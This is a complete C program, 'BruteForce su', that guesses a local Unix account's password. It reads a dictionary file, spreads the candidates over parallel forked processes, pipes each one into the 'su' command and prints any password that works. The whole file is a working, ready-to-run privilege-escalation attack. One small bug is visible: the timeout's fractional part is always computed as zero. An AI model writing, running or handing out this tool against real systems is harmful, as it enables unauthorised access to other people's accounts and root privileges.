#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

double timeout_s = 1.0;

const char *escGreen = "\033[1;32m",
	*escBlue = "\033[1;34m",
	*escReset = "\033[0m";

void printHelp(const char *progname) {
	printf("Usage: %s -u user -p dictionary [-t timeout] [-j nproc] [-h]\n\n"
		"Options: \n"
		"  -u  User for brute force attack\n"
		"  -p  Dictionary file for passwords\n"
		"  -t  Timeout for password checking (default: 1.0)\n"
		"  -j  Number of threads (default: system's CPU count)\n"
		"  -h  Show this help message\n", progname);
	exit(1);
}

void printBanner(void) {
	printf("%s\n"
		"******************************\n"
		"*       BruteForce su        *\n"
		"******************************\n%s\n",
		escBlue, escReset);
}

int checkPass(const char *password, const char *user) {
	int pipefd[2];
	pid_t pid;

	if (pipe(pipefd) == -1 || (pid = fork()) == -1) {
		perror("Error in pipe or fork");
		return 0;
	}

	if (pid == 0) {
		close(pipefd[1]);

		int fd = open("/dev/null", O_WRONLY);
		bool err_in = (dup2(pipefd[0], STDIN_FILENO) == -1);
		bool err_out = (fd < 0 || dup2(fd, STDERR_FILENO) == -1);
		close(fd);

		if (err_in || err_out) {
			perror("Error in input or output redirection");
			exit(1);
		}

		execlp("su", "su", user, (char *)NULL);
		perror("execlp");
		exit(1);
	}

	close(pipefd[0]);
	write(pipefd[1], password, strlen(password));
	write(pipefd[1], "\n", 1);
	close(pipefd[1]);

	struct timespec ts = {
		.tv_sec = (int)timeout_s,
		.tv_nsec = (long)((timeout_s - timeout_s) * 1e9)
	};
	nanosleep(&ts, NULL);

	int status;
	if (waitpid(pid, &status, WNOHANG) == 0) {
		kill(pid, SIGKILL);
		waitpid(pid, &status, 0);
		return 0;
	}
	return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

void bruteForce(const char *dict, const char *user, int nproc) {
	FILE *file = fopen(dict, "r");
	if (!file) {
		perror("Error opening file");
		exit(1);
	}

	int count = 0;
	char *line = NULL;
	size_t len = 0;
	while (getline(&line, &len, file) != -1) {
		count++;
	}

	rewind(file);

	int proclines = count / nproc;
	int remlines = count % nproc;

	for (int i = 0; i < nproc; i++) {
		if (fork() == 0) {
			FILE *childfile = fopen(dict, "r");
			if (!childfile) {
				perror("Error opening file in child process");
				exit(1);
			}

			int startline = i * proclines
				+ (i < remlines ? i : remlines);
			int endline = startline + proclines
				+ (i < remlines ? 1 : 0);

			for (int j = 0; j < startline; j++) {
				getline(&line, &len, childfile);
			}

			for (int j = startline; j < endline; j++) {
				getline(&line, &len, childfile);

				line[strcspn(line, "\n")] = 0;

				printf("Trying password: %s\n", line);

				if (checkPass(line, user)) {
					printf("%sPassword found for user %s: %s%s\n",
						escGreen, user, line, escReset);
					exit(0);
				}
			}

			fclose(childfile);
			exit(0);
		}
	}

	for (int i = 0; i < nproc; i++) {
		wait(NULL);
	}

	free(line);
	fclose(file);
}

int main(int argc, char *argv[]) {
	int opt = 0;
	int nproc = 0;
	const char *user = NULL, *dict = NULL;

	while ((opt = getopt(argc, argv, "u:p:t:j:h")) != -1) {
		switch (opt) {
		case 'u':
			user = optarg;
			break;
		case 'p':
			dict = optarg;
			break;
		case 't':
			timeout_s = atof(optarg);
			break;
		case 'j':
			nproc = atoi(optarg);
			break;
		case 'h':
			printHelp(argv[0]);
			break;
		default:
			printHelp(argv[0]);
			break;
		}
	}

	if (!user || !dict) {
		printHelp(argv[0]);
	}

	printBanner();

	if (nproc <= 0) {
		nproc = (int)sysconf(_SC_NPROCESSORS_ONLN);
	}

	bruteForce(dict, user, nproc);

	return 0;
}
